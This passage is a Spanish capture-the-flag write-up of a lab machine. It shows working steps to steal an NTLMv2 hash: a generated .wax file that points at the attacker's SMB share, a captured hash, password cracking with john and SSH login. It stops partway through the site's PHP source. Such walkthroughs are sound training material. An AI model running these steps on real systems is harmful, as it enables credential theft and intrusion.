@@ -1,0 +1,943 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vulnlab - Media · MiguelRega7</title>
+<meta name="description" content="PortScan - Comenzamos escaneando los puertos abiertos por el protocolo TCP de la máquina víctima. Port 80 hash NTLMv2 - Vemos que está corriendo un servicio web y vemos las tecnolo"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">VulnLab</span><h1>Vulnlab - Media</h1><div class="meta"><span>◷</span><time>2024-03-26</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">PortScan - Comenzamos escaneando los puertos abiertos por el protocolo TCP de la máquina víctima. Port 80 hash NTLMv2 - Vemos que está corriendo un servicio web y vemos las tecnolo.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#port-80-hash-ntlmv2">Port 80 hash NTLMv2</a><a href="#shell-as-enox">Shell as enox</a><a href="#user-flag">User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-nt-authority-local">Shell as nt authority\local</a><a href="#nt-authority-system">nt authority system</a><a href="#root-txt">Root.txt</a></aside><article class="article-content" id="top"><p align="center">
+<img src="/assets/vulnlab/img/machines/media/media.png">
+</p>
+
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> de la máquina víctima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap nmap -sCV -p22,80,3389 10.10.73.104 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 12:52 CST
+Nmap scan report for 10.10.73.104
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 0b:b3:c0:80:40:88:e1:ae:aa:3b:5f:f4:c2:23:c0:0d (RSA)
+|   256 e0:80:3f:dd:b1:f8:fc:83:f5:de:d5:b3:2d:5a:4b:39 (ECDSA)
+|_  256 b5:32:c0:72:18:10:0f:24:5d:f8:e1:ce:2a:73:5c:1f (ED25519)
+80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: ProMotion Studio
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=MEDIA
+| Not valid before: 2023-10-09T13:41:32
+|_Not valid after:  2024-04-09T13:41:32
+| rdp-ntlm-info:
+|   Target_Name: MEDIA
+|   NetBIOS_Domain_Name: MEDIA
+|   NetBIOS_Computer_Name: MEDIA
+|   DNS_Domain_Name: MEDIA
+|   DNS_Computer_Name: MEDIA
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-02-29T18:53:02+00:00
+|_ssl-date: 2024-02-29T18:53:08+00:00; -1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+<h2 id="port-80-hash-ntlmv2">Port 80 hash NTLMv2</h2>
+<ul>
+<li>Vemos que está corriendo un servicio web y vemos las tecnologías que se están empleando.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">➜  nmap whatweb http://10.10.73.104
+http://10.10.73.104 [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17], IP[10.10.73.104], OpenSSL[1.1.1t], PHP[8.1.17], Script, Title[ProMotion Studio], X-Powered-By[PHP/8.1.17]
+</code></pre></div></div>
+<ul>
+<li>Esta es la página web.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/XOYElZE.png">
+</p>
+
+<ul>
+<li>Si bajamos observamos que tenemos algo interesante donde nos deja subir archivos.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/L6JoPu4.png">
+</p>
+
+<ul>
+<li>Bueno nos dice que por detrás debe de ser compatible con <strong>Windows Media Player</strong>.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/RJPzUju.png">
+</p>
+
+<ul>
+<li>Existe una herramienta que se llama <a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a> que lo que hace es generar varios archivos los cuales funcionan para robar el <strong>hash</strong> <strong>NTLMVv2</strong> (NT LAN Manager) en este caso usaremos solo los que son compatibles que nos dicen en la página <strong>web</strong> <a href="https://book.hacktricks.xyz/v/es/windows-hardening/ntlm">https://book.hacktricks.xyz/v/es/windows-hardening/ntlm</a> <a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a> cuando la persona que está por detras revise el <strong>.wax</strong> que voy a subir durante el proceso de autenticación se va a generar el hash y no va a llegar vamos a instalar la herramienta.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap pip3 install xlsxwriter
+➜  nmap git clone https://github.com/Greenwolf/ntlm_theft
+</code></pre></div></div>
+<ul>
+<li>Con esto ya estaría.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ntlm_theft git:(master) python3 ntlm_theft.py -g wax -s 10.8.1.127 -f stealhash
+Created: stealhash/stealhash.wax (OPEN)
+Generation Complete.
+➜  ntlm_theft git:(master) ✗
+</code></pre></div></div>
+<ul>
+<li>Aquí vemos el contenido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  stealhash git:(master) ✗ cat stealhash.wax
+https://10.8.1.127/test
+file://\\10.8.1.127/steal/file%                                                                                                                    ➜  stealhash git:(master) ✗
+</code></pre></div></div>
+<ul>
+<li>Vemos que la <strong>url</strong> aputan a un archivo en nuestro sistema que se llama <strong>test</strong> no es necesario que exista y después con <strong>file</strong> le indica que es un enlace a un archivo en el sistema de archivos local o una red compartida para que esto funcione podemos usar <strong>responder</strong> o <strong>impacket-smbserver</strong> para que nos llegue el <strong>hash</strong> en mi caso estaré empleando <strong>impacket-smbserver</strong>, pero puede ser con cualquiera de los 2.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  stealhash git:(master) ✗ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a subir a la web él <strong>.wax</strong> que nos creó la herramienta.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/hRgbnnB.png">
+</p>
+
+<ul>
+<li>Una vez lo subimos vamos a esperar a que alguien por detrás lo revise para obtener su <strong>hash</strong> <strong>Ntlmv2</strong>.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/kkyMIjJ.png">
+</p>
+
+<ul>
+<li>Y bueno tenemos el <strong>hash</strong> del usuario <strong>enox</strong> vamos a crackearlo con <strong>john</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  stealhash git:(master) ✗ cat hash
+enox::MEDIA:aaaaaaaaaaaaaaaa:7e3190c5c1f9db76bfc360f64ec94557:010100000000000000e4af7f456bda01121927e5fa2e588b0000000001001000430079006b006a00440078004100440003001000430079006b006a0044007800410044000200100064004100590064004d0074007a0065000400100064004100590064004d0074007a0065000700080000e4af7f456bda0106000400020000000800300030000000000000000000000000300000f56c0035a7b62431425b77bf8aa7260625be53589b34e8cddea5cc073973904c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
+</code></pre></div></div>
+<ul>
+<li>Esta es la contraseña del usuario <strong>enox</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  stealhash git:(master) ✗ john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+**********       (enox)
+1g 0:00:00:42 DONE (2024-02-29 13:32) 0.02333g/s 311262p/s 311262c/s 311262C/s 1234ถ6789..1234mind
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+<h2 id="shell-as-enox">Shell as enox</h2>
+<ul>
+<li>Como el puerto <strong>22</strong> que corresponde a <strong>SSH</strong> está abierto, vamos a conectarnos con las credenciales que tenemos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content ssh enox@10.10.73.104
+The authenticity of host '10.10.73.104 (10.10.73.104)' can't be established.
+ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.73.104' (ED25519) to the list of known hosts.
+enox@10.10.73.104's password:
+Microsoft Windows [Version 10.0.20348.1970]
+(c) Microsoft Corporation. All rights reserved.
+
+enox@MEDIA C:\Users\enox&gt;whoami
+media\enox
+
+enox@MEDIA C:\Users\enox&gt;
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Como siempre en el <strong>Desktop</strong> del usuario se encuentra su flag.</li>
+</ul>
+<div class="code-window" data-language="PowerShell"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PowerShell</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-powershell">enox@MEDIA C:\Users\enox\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:\Users\enox\Desktop
+
+10/02/2023  10:04 AM    &lt;DIR&gt;          .
+10/02/2023  09:26 AM    &lt;DIR&gt;          ..
+10/10/2023  02:58 AM                36 user.txt
+               1 File(s)             36 bytes
+               2 Dir(s)   8,547,569,664 bytes free
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>En este directorio tenemos los archivos de la página web a donde subimos él <strong>.wax</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">enox@MEDIA C:\xampp\htdocs&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:\xampp\htdocs
+
+10/02/2023  09:27 AM    &lt;DIR&gt;          .
+10/02/2023  10:03 AM    &lt;DIR&gt;          ..
+10/02/2023  09:27 AM    &lt;DIR&gt;          assets
+10/02/2023  09:27 AM    &lt;DIR&gt;          css
+10/10/2023  04:00 AM            20,563 index.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          js
+               1 File(s)         20,563 bytes
+               5 Dir(s)   8,547,749,888 bytes free
+
+enox@MEDIA C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Este es el codigo fuente:</li>
+</ul>
+<div class="code-window" data-language="PHP"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PHP</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-php">enox@MEDIA C:\xampp\htdocs&gt;type index.php
+&lt;?php
+error_reporting(0);
+
+    // Your PHP code for handling form submission and file upload goes here.
+    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory
+
+    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot; &amp;&amp; isset($_FILES[&quot;fileToUpload&quot;])) {
+        $firstname = filter_var($_POST[&quot;firstname&quot;], FILTER_SANITIZE_STRING);
+        $lastname = filter_var($_POST[&quot;lastname&quot;], FILTER_SANITIZE_STRING);
+        $email = filter_var($_POST[&quot;email&quot;], FILTER_SANITIZE_STRING);
+
+        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
+        $folderName = md5($firstname . $lastname . $email);
+
+        // Create the full upload directory path
+        $targetDir = $uploadDir . $folderName . '/';
+
+        // Ensure the directory exists; create it if not
+        if (!file_exists($targetDir)) {
+            mkdir($targetDir, 0777, true);
+        }
+
+        // Sanitize the filename to remove unsafe characters
+        $originalFilename = $_FILES[&quot;fileToUpload&quot;][&quot;name&quot;];
+        $sanitizedFilename = preg_replace(&quot;/[^a-zA-Z0-9._]/&quot;, &quot;&quot;, $originalFilename);
+
+
+        // Build the full path to the target file
+        $targetFile = $targetDir . $sanitizedFilename;
+
+        if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $targetFile)) {
+            echo &quot;&lt;script&gt;alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');&lt;/script&gt;&quot;;
+
+            // Update the todo.txt file
+            $todoFile = $uploadDir . 'todo.txt';
+            $todoContent = &quot;Filename: &quot; . $originalFilename . &quot;, Random Variable: &quot; . $folderName . &quot;\n&quot;;
+
+            // Append the new line to the file
+            file_put_contents($todoFile, $todoContent, FILE_APPEND);
+        } else {
+            echo &quot;&lt;script&gt;alert('Uh oh, something went wrong... Please submit again');&lt;/script&gt;&quot;;
+        }
+    }
+    ?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot; /&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot; /&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;&quot; /&gt;
+    &lt;title&gt;ProMotion Studio&lt;/title&gt;
+    &lt;!-- Favicon--&gt;
+    &lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;assets/favicon.ico&quot; /&gt;
+    &lt;!-- Font Awesome icons (free version)--&gt;
+    &lt;script src=&quot;https://use.fontawesome.com/releases/v6.3.0/js/all.js&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;!-- Google fonts--&gt;
+    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Montserrat:400,700&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+    &lt;!-- Core theme CSS (includes Bootstrap)--&gt;
+    &lt;link href=&quot;css/styles.css&quot; rel=&quot;stylesheet&quot; /&gt;
+&lt;/head&gt;
+
+&lt;body id=&quot;page-top&quot;&gt;
+    &lt;!-- Navigation--&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark fixed-top&quot; id=&quot;mainNav&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarResponsive&quot;
+                aria-controls=&quot;navbarResponsive&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                Menu
+                &lt;i class=&quot;fas fa-bars ms-1&quot;&gt;&lt;/i&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarResponsive&quot;&gt;
+                &lt;ul class=&quot;navbar-nav text-uppercase ms-auto py-4 py-lg-0&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#services&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#team&quot;&gt;Team&lt;/a&gt;&lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;&lt;a class=&quot;nav-link&quot; href=&quot;#contact&quot;&gt;Hiring&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;!-- Masthead--&gt;
+    &lt;header class=&quot;masthead&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;masthead-subheading&quot;&gt;Welcome To Our Studio!&lt;/div&gt;
+            &lt;div class=&quot;masthead-heading text-uppercase&quot;&gt;It's Nice To Meet You&lt;/div&gt;
+            &lt;a class=&quot;btn btn-primary btn-xl text-uppercase&quot; href=&quot;#services&quot;&gt;Tell Me More&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+    &lt;!-- Services--&gt;
+    &lt;section class=&quot;page-section&quot; id=&quot;services&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center&quot;&gt;
+                &lt;h2 class=&quot;section-heading text-uppercase&quot;&gt;Services&lt;/h2&gt;
+                &lt;h3 class=&quot;section-subheading text-muted&quot;&gt;Professional Services&lt;/h3&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;row text-center&quot;&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;span class=&quot;fa-stack fa-4x&quot;&gt;
+                        &lt;i class=&quot;fas fa-circle fa-stack-2x text-primary&quot;&gt;&lt;/i&gt;
+                        &lt;i class=&quot;fas fa-shopping-cart fa-stack-1x fa-inverse&quot;&gt;&lt;/i&gt;
+                    &lt;/span&gt;
+                    &lt;h4 class=&quot;my-3&quot;&gt;E-Commerce Solutions&lt;/h4&gt;
+                    &lt;p class=&quot;text-muted&quot;&gt;Enhance your online business with our cutting-edge e-commerce solutions. We
+                        provide a seamless shopping experience for your customers, from product selection to secure
+                        checkout.&lt;/p&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;span class=&quot;fa-stack fa-4x&quot;&gt;
+                        &lt;i class=&quot;fas fa-circle fa-stack-2x text-primary&quot;&gt;&lt;/i&gt;
+                        &lt;i class=&quot;fas fa-laptop fa-stack-1x fa-inverse&quot;&gt;&lt;/i&gt;
+                    &lt;/span&gt;
+                    &lt;h4 class=&quot;my-3&quot;&gt;Responsive Web Design&lt;/h4&gt;
+                    &lt;p class=&quot;text-muted&quot;&gt;Our websites are built with responsive design in mind, ensuring that your site
+                        looks and works flawlessly on any device. Reach a wider audience and improve user satisfaction
+                        with our designs.&lt;/p&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;span class=&quot;fa-stack fa-4x&quot;&gt;
+                        &lt;i class=&quot;fas fa-circle fa-stack-2x text-primary&quot;&gt;&lt;/i&gt;
+                        &lt;i class=&quot;fas fa-lock fa-stack-1x fa-inverse&quot;&gt;&lt;/i&gt;
+                    &lt;/span&gt;
+                    &lt;h4 class=&quot;my-3&quot;&gt;Robust Web Security&lt;/h4&gt;
+                    &lt;p class=&quot;text-muted&quot;&gt;Protect your online presence with our state-of-the-art web security solutions.
+                        We prioritize the safety of your data and user information, keeping your website and customers
+                        secure.&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+    &lt;!-- About--&gt;
+    &lt;section class=&quot;page-section&quot; id=&quot;about&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center&quot;&gt;
+                &lt;h2 class=&quot;section-heading text-uppercase&quot;&gt;About Us&lt;/h2&gt;
+                &lt;h3 class=&quot;section-subheading text-muted&quot;&gt;Discover our journey and milestones.&lt;/h3&gt;
+            &lt;/div&gt;
+            &lt;ul class=&quot;timeline&quot;&gt;
+                &lt;li&gt;
+                    &lt;div class=&quot;timeline-image&quot;&gt;&lt;img class=&quot;rounded-circle img-fluid&quot; src=&quot;assets/img/about/1.jpg&quot;
+                            alt=&quot;Our Humble Beginnings&quot; /&gt;&lt;/div&gt;
+                    &lt;div class=&quot;timeline-panel&quot;&gt;
+                        &lt;div class=&quot;timeline-heading&quot;&gt;
+                            &lt;h4&gt;2017-2020&lt;/h4&gt;
+                            &lt;h4 class=&quot;subheading&quot;&gt;Our Humble Beginnings&lt;/h4&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;timeline-body&quot;&gt;
+                            &lt;p class=&quot;text-muted&quot;&gt;In the early years, our journey began with a small team of passionate
+                                individuals. We embarked on a mission to deliver innovative solutions, and our
+                                dedication soon started to bear fruit.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li class=&quot;timeline-inverted&quot;&gt;
+                    &lt;div class=&quot;timeline-image&quot;&gt;&lt;img class=&quot;rounded-circle img-fluid&quot; src=&quot;assets/img/about/2.jpg&quot;
+                            alt=&quot;An Agency is Born&quot; /&gt;&lt;/div&gt;
+                    &lt;div class=&quot;timeline-panel&quot;&gt;
+                        &lt;div class=&quot;timeline-heading&quot;&gt;
+                            &lt;h4&gt;March 2021&lt;/h4&gt;
+                            &lt;h4 class=&quot;subheading&quot;&gt;An Agency is Born&lt;/h4&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;timeline-body&quot;&gt;
+                            &lt;p class=&quot;text-muted&quot;&gt;In March 2021, our agency officially came into existence. With a clear
+                                vision and determination, we transformed into a full-fledged agency, ready to serve our
+                                clients with excellence.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                    &lt;div class=&quot;timeline-image&quot;&gt;&lt;img class=&quot;rounded-circle img-fluid&quot; src=&quot;assets/img/about/3.jpg&quot;
+                            alt=&quot;Transition to Full Service&quot; /&gt;&lt;/div&gt;
+                    &lt;div class=&quot;timeline-panel&quot;&gt;
+                        &lt;div class=&quot;timeline-heading&quot;&gt;
+                            &lt;h4&gt;December 2022&lt;/h4&gt;
+                            &lt;h4 class=&quot;subheading&quot;&gt;Transition to Full Service&lt;/h4&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;timeline-body&quot;&gt;
+                            &lt;p class=&quot;text-muted&quot;&gt;By December 2022, we had evolved into a full-service agency, offering
+                                a wide range of solutions to meet our clients' diverse needs. Our commitment to quality
+                                remained unwavering.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li class=&quot;timeline-inverted&quot;&gt;
+                    &lt;div class=&quot;timeline-image&quot;&gt;&lt;img class=&quot;rounded-circle img-fluid&quot; src=&quot;assets/img/about/4.jpg&quot;
+                            alt=&quot;Phase Two Expansion&quot; /&gt;&lt;/div&gt;
+                    &lt;div class=&quot;timeline-panel&quot;&gt;
+                        &lt;div class=&quot;timeline-heading&quot;&gt;
+                            &lt;h4&gt;July 2023&lt;/h4&gt;
+                            &lt;h4 class=&quot;subheading&quot;&gt;Phase Two Expansion&lt;/h4&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;timeline-body&quot;&gt;
+                            &lt;p class=&quot;text-muted&quot;&gt;In July 2023, we embarked on an exciting phase of expansion. With new
+                                opportunities on the horizon, we're dedicated to delivering even greater value to our
+                                clients and partners.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/li&gt;
+                &lt;li class=&quot;timeline-inverted&quot;&gt;
+                    &lt;div class=&quot;timeline-image&quot;&gt;
+                        &lt;h4&gt;
+                            Be Part
